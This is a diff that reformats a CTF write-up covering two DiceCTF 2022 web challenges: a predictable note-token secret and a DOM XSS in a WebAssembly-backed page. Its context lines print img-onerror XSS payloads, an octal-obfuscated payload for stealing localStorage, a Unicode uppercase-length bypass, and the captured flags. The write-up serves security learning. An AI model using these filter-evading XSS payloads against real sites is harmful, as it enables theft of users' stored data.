@@ -47,7 +47,9 @@ By introducing a message, we get a link to it:
 [test](https://knock-knock.mc.ax/note?id=38024&token=8da2562a4d90547d6f6b9fdb79031b5bb2f9c7d4a4956b32b8972b46c43d144e)
 [tes2](https://knock-knock.mc.ax/note?id=37984&token=ffd80b280a47d2b16ec0f73492ae7195086ad615b531e9c8e3cdaecf9819a5e4)
 
-<img src="/images/writeups/DiceCTF2022/Web/1_00.png" width="70%"/>
+<p align="center">
+    <img src="/images/writeups/DiceCTF2022/Web/1_00_web.png" width="70%"/>
+</p>
 
 I have built the website locally, since I want to inspect the secret used to create the hash:
 
@@ -215,7 +217,9 @@ Knowing that the flag is introduced at launch, index is 0 and the token is 7bd88
 
 [https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264](https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264)
 
-<img src="/images/writeups/DiceCTF2022/Web/1_0_flag.png" width="70%"/>
+<p align="center">
+    <img src="/images/writeups/DiceCTF2022/Web/1_0_flag.png" width="70%"/>
+</p>
 
 ``` dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r} ```
 
@@ -394,7 +398,7 @@ WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance })
 </html>
 ```
 
-We can spot an [DOM XSS vulnerability](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) on the innerHTML in the JS. It's value will be set to the result of the mock function with our input as a parameter:
+We can spot a [DOM XSS vulnerability](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) on the innerHTML in the JS. It's value will be set to the result of the mock function with our input as a parameter:
 
 ```js
 function demo(str) {
@@ -463,7 +467,7 @@ int mock() {
 }
 ```
 
-Now moving into explotation, we know that normal XSS payloads with <script> </script> won't work in HTML5, therefore we need to use an _<img src=x onerror="l">_ kind of payload.
+Now moving into explotation, we know that normal XSS payloads with ``` <script> </script> ``` won't work in HTML5, therefore we need to use an ``` <img src=x onerror="l"> ``` kind of payload.
 
 At first we had three paths to explore:
 
@@ -472,7 +476,7 @@ At first we had three paths to explore:
 - TOCTOU over string length
 
 
-_Bypass forbidden characters detection_
+#### Bypass forbidden characters detection
 
 Concept: How about using Unicode bypasses?
 
@@ -488,7 +492,7 @@ Trick didn't worked out, due to this check on the JS. Our unicode characters wer
 if (c.charCodeAt(0) > 128) return 'Nice try.';
 ```
 
-_Algorithm logic_
+#### Algorithm logic
 
 **Spoiler: base concept was wrong, since we couldn't achieve a two URL call in the admin ^^'**
 
@@ -503,7 +507,9 @@ https://blazingfast.mc.ax/?demo=.....%3Cimg%20src=%27x%27%20onerror=%27alert(1)%
 
 Then, we remove the part with the payload and left the valid offset. Call the function again and we can see that the payload is being written into the HTML. alert is not popping due to the uppercase done previously in the JS, the rest of the payload is working fine, since browser is correctly interpreting the HTML keywords:
 
-<img src="/images/writeups/DiceCTF2022/Web/2_01.png" width="70%"/>
+<p align="center">
+    <img src="/images/writeups/DiceCTF2022/Web/2_01.png" width="70%"/>
+</p>
 
 Now moving into crafting a payload. We have to steal the flag value from localstorage with a payload like this:
 
@@ -532,19 +538,23 @@ https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[]["\146\151\154\164\145
 
 Then we bypassed the uppercase filter and got our local exploit using the URL parameter and changing the payload length:
 
-<img src="/images/writeups/DiceCTF2022/Web/2_02.png" width="70%"/>
+<p align="center">
+    <img src="/images/writeups/DiceCTF2022/Web/2_02.png" width="70%"/>
+</p>
 
 Now things got complicated in this path since we found no method to replicate this on the admin bot :(
 
 
-_TOCTOU on string length_
+#### TOCTOU on string length
 
 We tried many things with special characters and unicode, looking at the documentation for toUpperCase, but missed the great ß character.
 Check out the great [writeup on this task](https://brycec.me/posts/dicectf_2022_writeups#blazingfast)
 
 Main idea is that ß character has length of 1, but when converted to uppercase in JS, it converts to "SS", 2 char length:
 
-<img src="/images/writeups/DiceCTF2022/Web/2_03.png" width="50%"/>
+<p align="center">
+    <img src="/images/writeups/DiceCTF2022/Web/2_03.png" width="30%"/>
+</p>
 
 Then we have to add at least, the same number of ß as our payload:
 
@@ -560,9 +570,13 @@ https://blazingfast.mc.ax/?demo=ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ
 
 Once the input is passed to the admin, the flag will show up in the weebhok site:
 
-<img src="/images/writeups/DiceCTF2022/Web/2_04.png" width="50%"/>
+<p align="center">
+  <img src="/images/writeups/DiceCTF2022/Web/2_04.png" width="70%"/>
+</p>
 
-<img src="/images/writeups/DiceCTF2022/Web/2_4_flag.png" width="70%"/>
+<p align="center">
+  <img src="/images/writeups/DiceCTF2022/Web/2_4_flag.png" width="90%"/>
+</p>
 
 
 ``` dice{1_dont_know_how_to_write_wasm_pwn_s0rry} ```
